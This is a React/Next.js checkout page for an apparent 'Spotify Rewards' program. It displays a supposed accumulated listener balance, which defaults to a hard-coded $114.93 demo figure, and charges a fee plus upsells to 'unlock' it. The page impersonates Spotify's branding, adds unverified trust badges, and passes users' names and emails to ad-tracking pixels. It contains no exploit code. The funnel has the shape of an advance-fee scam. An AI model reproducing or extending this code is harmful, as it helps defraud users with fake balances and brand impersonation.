  { code: 'US', name: 'United States' },
  { code: 'BR', name: 'Brazil' },
  { code: 'CA', name: 'Canada' },
  { code: 'GB', name: 'United Kingdom' },
  { code: 'AU', name: 'Australia' },
  { code: 'DE', name: 'Germany' },
  { code: 'FR', name: 'France' },
  { code: 'ES', name: 'Spain' },
  { code: 'IT', name: 'Italy' },
  { code: 'PT', name: 'Portugal' },
  { code: 'MX', name: 'Mexico' },
  { code: 'AR', name: 'Argentina' },
  { code: 'CO', name: 'Colombia' },
  { code: 'CL', name: 'Chile' },
  { code: 'PE', name: 'Peru' },
  { code: 'JP', name: 'Japan' },
  { code: 'IN', name: 'India' },
];

function PaymentPageContent() {
  const router = useRouter();
  const searchParams = useSearchParams();

  const rawOfferParam = searchParams.get('offer') as OfferIdType | null;
  const activeOfferId: OfferIdType =
    rawOfferParam && OFFER_CHECKOUT_CONFIGS[rawOfferParam]
      ? rawOfferParam
      : 'front_9_00';
  const offerConfig = OFFER_CHECKOUT_CONFIGS[activeOfferId];
  const isUpsellCheckout = activeOfferId !== 'front_9_00';

  const [balanceData, setBalanceData] = useState<{
    balance: number;
    currency: string;
    formatted: string;
    isDemo: boolean;
  }>({
    balance: 114.93,
    currency: 'USD',
    formatted: '$114.93',
    isDemo: true,
  });

  const [clientSecret, setClientSecret] = useState<string | null>(null);
  const [isStripeLive, setIsStripeLive] = useState<boolean>(false);
  const [chargeAmountFormatted, setChargeAmountFormatted] = useState<string>(offerConfig.priceFormatted);
  const [isInitializingPayment, setIsInitializingPayment] = useState<boolean>(true);

  const [fullName, setFullName] = useState('');
  const [email, setEmail] = useState('');
  const [country, setCountry] = useState('US');
  const [paymentSuccess, setPaymentSuccess] = useState(false);

  // Sync price when offer param changes
  useEffect(() => {
    setChargeAmountFormatted(offerConfig.priceFormatted);
  }, [offerConfig.priceFormatted]);

  // Auto-fill fullName, email, and current balance from sessionStorage/localStorage
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const savedName =
        sessionStorage.getItem('spotify_listener_name') ||
        localStorage.getItem('spotify_listener_name');
      const savedEmail =
        sessionStorage.getItem('spotify_listener_email') ||
        sessionStorage.getItem('spotify_current_user') ||
        localStorage.getItem('spotify_listener_email');

      if (savedName && savedName.trim() && savedName !== 'MEU NOME') {
        setFullName(savedName.trim());
      }
      if (savedEmail && savedEmail.trim()) {
        const cleanEmail = savedEmail.trim();
        setEmail(cleanEmail);

        // If user already has an accumulated balance in localStorage, show it!
        const storedBal = localStorage.getItem('spotify_account_balance_' + cleanEmail.toLowerCase());
        if (storedBal) {
          const parsedBal = parseFloat(storedBal);
          if (!isNaN(parsedBal) && parsedBal > 0) {
            setBalanceData({
              balance: parsedBal,
              currency: 'USD',
              formatted: `$${parsedBal.toFixed(2)}`,
              isDemo: false,
            });
          }
        }

        upsertCustomer({
          email: cleanEmail,
          full_name: savedName && savedName !== 'MEU NOME' ? savedName.trim() : undefined,
        }).catch(() => {});
      }
    }
  }, []);

  // Load balance from backend if front-end checkout
  useEffect(() => {
    if (isUpsellCheckout) return;
    async function fetchBalance() {
      try {
        const res = await fetch('/api/user/balance');
        if (res.ok) {
          const data = await res.json();
          setBalanceData(data);
        }
      } catch (e) {}
    }
    fetchBalance();
  }, [isUpsellCheckout]);

  // Initialize PaymentIntent for the specific offer
  useEffect(() => {
    async function initPayment() {
      setIsInitializingPayment(true);
      try {
        const storedEmail =
          typeof window !== 'undefined'
            ? sessionStorage.getItem('spotify_listener_email') ||
              sessionStorage.getItem('spotify_current_user') ||
              ''
            : '';
        const storedName =
          typeof window !== 'undefined'
            ? sessionStorage.getItem('spotify_listener_name') || ''
            : '';

        const res = await fetch('/api/stripe/create-payment-intent', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            offerId: activeOfferId,
            email: email || storedEmail,
            name: fullName || storedName,
            sessionId:
              typeof window !== 'undefined' ? sessionStorage.getItem('spotify_session_id') : null,
          }),
        });

        if (res.ok) {
          const data = await res.json();
          if (data.displayAmount) {
            setChargeAmountFormatted(data.displayAmount);
          }
          if (data.clientSecret) {
            setClientSecret(data.clientSecret);
            setIsStripeLive(true);
          } else {
            setIsStripeLive(false);
          }
        }
      } catch (err) {
        console.warn('Could not initialize Stripe intent, falling back to test mode:', err);
      } finally {
        setIsInitializingPayment(false);
      }
    }

    initPayment();
  }, [activeOfferId]);

  const handlePaymentSuccess = async () => {
    setPaymentSuccess(true);

    const finalEmail =
      email.trim() ||
      (typeof window !== 'undefined'
        ? sessionStorage.getItem('spotify_listener_email') ||
          sessionStorage.getItem('spotify_current_user') ||
          localStorage.getItem('spotify_listener_email') ||
          'listener@spotifyrewards.com'
        : 'listener@spotifyrewards.com');

    const finalName =
      fullName.trim() ||
      (typeof window !== 'undefined'
        ? sessionStorage.getItem('spotify_listener_name') ||
          localStorage.getItem('spotify_listener_name') ||
          'Verified Listener'
        : 'Verified Listener');

    if (typeof window !== 'undefined') {
      sessionStorage.setItem('spotify_logged_in', 'true');
      sessionStorage.setItem('spotify_listener_email', finalEmail);
      sessionStorage.setItem('spotify_listener_name', finalName);
      localStorage.setItem('spotify_current_user', finalEmail);
      localStorage.setItem('spotify_listener_email', finalEmail);
      localStorage.setItem('spotify_listener_name', finalName);

      if (!localStorage.getItem('spotify_payment_date')) {
        const nowIso = new Date().toISOString();
        sessionStorage.setItem('spotify_payment_date', nowIso);
        localStorage.setItem('spotify_payment_date', nowIso);
      }
    }

    // Track Purchase / CompletePayment on TikTok Pixel (DBRAD8BC77U7CBT5UTL0) + Meta Pixel + CAPI
    trackFunnelPixelEvent(
      'Purchase',
      {
        content_id: activeOfferId,
        content_name: offerConfig.summaryTitle,
        content_type: 'product',
        value: offerConfig.price,
        currency: 'USD',
        num_items: 1,
      },
      {
        email: finalEmail,
        full_name: finalName,
      }
    );

    // Unlock the specific Upsell/Downsell benefit ONLY now that payment is approved!
    if (isUpsellCheckout) {
      await unlockOfferBenefitAfterPayment(finalEmail, activeOfferId);
    }

    setTimeout(() => {
      router.push(offerConfig.redirectUrl);
    }, 2200);
  };

  return (
    <div className="min-h-screen bg-[#070a08] text-[#e0e0e0] font-sans antialiased relative overflow-hidden selection:bg-[#1db954] selection:text-black">
      <MetaPixelTracker
        eventName="InitiateCheckout"
        customData={{
          content_id: activeOfferId,
          content_name: offerConfig.summaryTitle,
          content_type: 'product',
          value: offerConfig.price,
          currency: 'USD',
        }}
        userData={{
          email,
          full_name: fullName,
        }}
      />

      <div className="absolute top-0 left-0 w-full h-[650px] bg-[radial-gradient(ellipse_80%_60%_at_25%_15%,rgba(29,185,84,0.18),rgba(15,35,22,0.45)_50%,transparent_80%)] pointer-events-none -z-10" />
      <div className="absolute inset-0 bg-[linear-gradient(to_right,#1db95408_1px,transparent_1px),linear-gradient(to_bottom,#1db95408_1px,transparent_1px)] bg-[size:3rem_3rem] [mask-image:radial-gradient(ellipse_60%_50%_at_50%_0%,#000_70%,transparent_100%)] pointer-events-none -z-10" />

      {/* Top Header / Branding */}
      <header className="max-w-6xl mx-auto px-4 sm:px-6 pt-6 pb-4 flex items-center justify-between">
        <Link
          href={isUpsellCheckout ? '/spotify/dashboard' : '/spotify'}
          className="flex items-center gap-2.5 transition-opacity hover:opacity-90"
        >
          <div className="relative w-8 h-8 rounded-full overflow-hidden bg-black flex items-center justify-center">
            <Image
              src="/spotify-logo.webp"
              alt="Spotify Logo"
              width={32}
              height={32}
              priority
              referrerPolicy="no-referrer"
            />
          </div>
          <div className="flex items-center gap-1.5">
            <span className="text-white font-extrabold text-lg sm:text-xl tracking-tight">
              Spotify
            </span>
            <span className="bg-[#1db954] text-black text-[11px] font-black uppercase px-2 py-0.5 rounded-full tracking-wide">
              Rewards
            </span>
          </div>
        </Link>

        {isUpsellCheckout && (
          <Link
            href="/spotify/dashboard"
            className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full bg-[#111613] hover:bg-[#19221c] border border-[#243028] text-xs font-bold text-gray-300 hover:text-white transition-colors"
          >
            <ArrowLeft className="w-3.5 h-3.5 text-[#1db954]" />
            <span>Back to Music Dashboard</span>
          </Link>
        )}
      </header>

      {/* Main Content */}
      <main className="max-w-6xl mx-auto px-4 sm:px-6 py-6 sm:py-10">
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 lg:gap-12 items-start">
          {/* LEFT COLUMN: PERSONALIZED PRODUCT / UPSELL DETAILS */}
          <div className="lg:col-span-6 space-y-6 pt-1">
            <div>
              <span className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-[#0d2215] text-[#1db954] border border-[#1db954]/40 text-xs font-black uppercase tracking-wider mb-4">
                <Sparkles className="w-3.5 h-3.5" />
                <span>{offerConfig.badgeText}</span>
              </span>

              <h1 className="text-3xl sm:text-4xl md:text-5xl font-black text-white tracking-tight leading-tight">
                {offerConfig.headingPrefix}{' '}
                <span className="text-[#1db954] font-black">
                  {activeOfferId === 'front_9_00'
                    ? `${balanceData.formatted} is Ready`
                    : offerConfig.headingHighlight}
                </span>
              </h1>

              <p className="text-sm sm:text-base text-gray-300 mt-3 leading-relaxed">
                {offerConfig.subheading}
              </p>
            </div>

            {/* Dynamic Feature Checklist */}
            <div className="space-y-4 pt-1">
              {offerConfig.bullets.map((b, idx) => (
                <div key={idx} className="flex items-start gap-3.5">
                  <div className="w-6 h-6 rounded-full border border-[#1db954] flex items-center justify-center text-[#1db954] shrink-0 mt-0.5 bg-[#1db954]/10">
                    <Check className="w-3.5 h-3.5 stroke-[3]" />
                  </div>
                  <div className="text-xs sm:text-sm text-gray-300 leading-snug">
                    <b className="text-white font-bold">{b.bold}</b> {b.text}
                  </div>
                </div>
              ))}
            </div>

            {/* Bottom Guarantee Row */}
            <div className="pt-4 border-t border-white/5 flex flex-wrap items-center gap-4 sm:gap-6 text-xs text-gray-400 font-medium">
              <div className="flex items-center gap-1.5">
                <Clock className="w-4 h-4 text-[#1db954]" />
                <span>Instant Account Unlock</span>
              </div>
              <div className="flex items-center gap-1.5">
                <ShieldCheck className="w-4 h-4 text-[#1db954]" />
                <span>Bank-Grade 256-Bit SSL</span>
              </div>
              <div className="flex items-center gap-1.5">
                <TrendingUp className="w-4 h-4 text-[#1db954]" />
                <span>Verified Listener Upgrade</span>
              </div>
            </div>
          </div>

          {/* RIGHT COLUMN: INTEGRATED CHECKOUT CARD */}
          <div className="lg:col-span-6">
            <div className="rounded-3xl bg-[#0b0e0c] border border-[#1d2520] p-6 sm:p-8 shadow-2xl shadow-black relative backdrop-blur-xl">
              {/* Card Header: Accumulated Balance */}
              <div className="flex items-center justify-between pb-5 border-b border-[#1d2520] mb-6">
                <div>
                  <span className="block text-[11px] font-extrabold uppercase tracking-widest text-[#8a9890]">
                    {isUpsellCheckout ? 'YOUR CURRENT LISTENER BALANCE' : 'ACCUMULATED BALANCE'}
                  </span>
                  <span className="text-xs text-[#8a9890] mt-0.5 block">
                    {isUpsellCheckout
                      ? 'Protected in your active listener account'
                      : 'Ready for release to your account'}
                  </span>
                </div>
                <div className="text-3xl sm:text-4xl font-extrabold text-[#1db954] tracking-tight">
                  {balanceData.formatted}
                </div>
              </div>

              {/* Personalized Order Summary Box */}
              <div className="mb-6 p-4 rounded-2xl bg-[#111613] border border-[#1db954]/30 flex items-center justify-between text-xs">
                <div>
                  <span className="font-bold text-white block text-sm">
                    {offerConfig.summaryTitle}
                  </span>
                  <span className="text-[#8a9890] text-xs mt-0.5 block">
                    {offerConfig.summarySubtitle}
                  </span>
                </div>
                <div className="text-right shrink-0 ml-3">
                  {offerConfig.originalPriceFormatted && (
                    <span className="text-xs text-gray-500 line-through mr-1.5">
                      ${offerConfig.originalPriceFormatted}
                    </span>
                  )}
                  <span className="text-base font-black text-white inline-block">
                    ${chargeAmountFormatted} USD
                  </span>
                  <span className="block text-xs text-[#1db954] font-semibold mt-0.5">
                    {offerConfig.summaryRightTag}
                  </span>
                </div>
              </div>

              {/* Render Official Stripe Elements or High-Fidelity Test Mode */}
              {isInitializingPayment ? (
                <div className="py-12 flex flex-col items-center justify-center gap-3 text-gray-400">
                  <RefreshCw className="w-6 h-6 animate-spin text-[#1db954]" />
                  <span className="text-xs">Initializing secure checkout session...</span>
                </div>
              ) : isStripeLive && clientSecret && stripePromise ? (
                <Elements
                  stripe={stripePromise}
                  options={{
                    clientSecret,
                    locale: 'en',
                    appearance: {
                      theme: 'night',
                      variables: {
                        colorPrimary: '#1db954',
                        colorBackground: '#131715',
                        colorText: '#ffffff',
                        colorDanger: '#ef4444',
                        fontFamily: 'system-ui, -apple-system, sans-serif',
                        borderRadius: '16px',
                      },
                    },
                  }}
                >
                  <StripePaymentForm
                    clientSecret={clientSecret}
                    fullName={fullName}
                    setFullName={setFullName}
                    email={email}
                    setEmail={setEmail}
                    country={country}
                    offerConfig={offerConfig}
                    onSuccess={handlePaymentSuccess}
                  />
                </Elements>
              ) : (
                <InteractiveMockPaymentForm
                  fullName={fullName}
                  setFullName={setFullName}
                  email={email}
                  setEmail={setEmail}
                  country={country}
                  setCountry={setCountry}
                  offerConfig={offerConfig}
                  onSuccess={handlePaymentSuccess}
                />
              )}

              {/* Trust & Compliance Footer */}
              <div className="mt-6 pt-5 border-t border-[#1d2520] flex flex-wrap items-center justify-center gap-3 text-[11px] text-[#707e76]">
                <span className="flex items-center gap-1.5">
                  <Lock className="w-3.5 h-3.5 text-[#1db954]" /> 256-Bit SSL Encrypted
                </span>
                <span>•</span>
                <span className="flex items-center gap-1.5">
                  <ShieldCheck className="w-3.5 h-3.5 text-[#1db954]" /> PCI-DSS Compliant
                </span>
                <span>•</span>
                <span>Processed by MM Systems</span>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* SUCCESS CONFIRMATION MODAL */}
      {paymentSuccess && (
        <div className="fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-center justify-center p-4">
          <div className="max-w-md w-full rounded-3xl bg-[#0e1410] border border-[#1db954]/50 p-6 sm:p-8 text-center shadow-2xl shadow-[#1db954]/20 animate-in fade-in zoom-in-95 duration-200">
            <div className="w-16 h-16 rounded-full bg-[#1db954]/20 text-[#1db954] flex items-center justify-center mx-auto mb-4 border border-[#1db954]/40">
              <CheckCircle2 className="w-10 h-10 stroke-[2.5]" />
            </div>

            <h3 className="text-2xl font-black text-white mb-2">
              {offerConfig.successModalTitle}
            </h3>

            <p className="text-sm text-gray-300 mb-4 leading-relaxed">
              {offerConfig.successModalDescription}
            </p>

            <div className="p-4 rounded-2xl bg-black/50 border border-white/10 mb-5 text-left space-y-2">
              <div className="flex justify-between text-xs">
                <span className="text-gray-400">Package Unlocked:</span>
                <span className="font-bold text-white">{offerConfig.summaryTitle}</span>
              </div>
              <div className="flex justify-between text-xs">
                <span className="text-gray-400">Amount Paid:</span>
                <span className="font-bold text-[#1db954]">${chargeAmountFormatted} USD</span>
              </div>
              <div className="flex justify-between text-xs">
                <span className="text-gray-400">Account Status:</span>
                <span className="font-bold text-[#1db954]">Active &amp; Unlocked</span>
              </div>
            </div>

            <div className="flex items-center justify-center gap-2 text-xs text-gray-400 mb-2">
              <RefreshCw className="w-3.5 h-3.5 animate-spin text-[#1db954]" />
              <span>
                {isUpsellCheckout
                  ? 'Returning to your Music Dashboard with your new upgrade...'
                  : 'Redirecting to orientation & onboarding...'}
              </span>
            </div>

            <Link
              href={offerConfig.redirectUrl}
              className="mt-4 block w-full py-3.5 rounded-full bg-[#1db954] text-black font-extrabold text-sm hover:bg-[#1ed760] transition-colors"
            >
              {offerConfig.successButtonLabel}
            </Link>
          </div>
        </div>
      )}

      {/* Global Footer */}
      <footer className="mt-16 border-t border-white/5 py-8 text-center text-xs text-gray-400 space-y-2">
        <p>&copy; {new Date().getFullYear()} Music Rewards Program &bull; Partner Verification Portal.</p>
        <div className="flex items-center justify-center gap-4 text-gray-400">
          <Link href="/politicasdeprivacidade" className="hover:text-gray-300 transition-colors">
            Privacy Policy
          </Link>
          <span>&bull;</span>
          <Link href="/suporte" className="hover:text-gray-300 transition-colors">
            Support Center
          </Link>
        </div>
      </footer>
    </div>
  );
}

export default function PaymentPage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-[#070a08] flex items-center justify-center text-white text-xs">
          Loading secure checkout...
        </div>
      }
    >
      <PaymentPageContent />
    </Suspense>
  );
}
